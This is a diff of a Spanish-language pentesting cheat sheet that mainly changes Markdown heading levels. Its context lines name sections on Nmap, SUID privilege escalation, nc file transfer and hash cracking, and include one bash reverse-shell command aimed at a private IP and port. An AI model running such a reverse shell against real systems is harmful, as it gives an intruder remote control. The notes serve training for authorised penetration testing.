@@ -2,7 +2,7 @@
 
 `Pentesting Notes` es una documento donde encontraras comandos para ayudarte rapidamente a realizar pentesting desde lo mas básico a lo avanzado.
 
-### Nmap
+## Nmap
 
 1. Usar **-T2** para entornos reales
 
@@ -136,7 +136,7 @@
    ```
 
 
-# Linux: Privilege escalation
+## Linux: Privilege escalation
 
 1. Buscar permisos en todos los archivos SUID
 
@@ -148,7 +148,7 @@
    ```
 
 
-# Data Base: SQL, MYSQL, SQLITE
+## Data Base: SQL, MYSQL, SQLITE
 
 1. Leear archivos sqlite
    
@@ -160,7 +160,7 @@
    ```
    
 
-# Linux: Comandos mas usados
+## Linux: Comandos mas usados
 
 1. Para trasnferir archivos usando nc
 
@@ -205,7 +205,7 @@
    /bin/bash -c 'bash -i >& /dev/tcp/10.9.2.251/4444 0>&1'
    ``` 
 
-# Sitios Web
+## Sitios Web
 
 1. Para descifrar hashes de contraseñas débiles
 
@@ -238,7 +238,7 @@
    ```
 
 
-# Extensiones para web browser
+## Extensiones para web browser
 
 1. Ripper Web Content | Capture Metadata Content
 
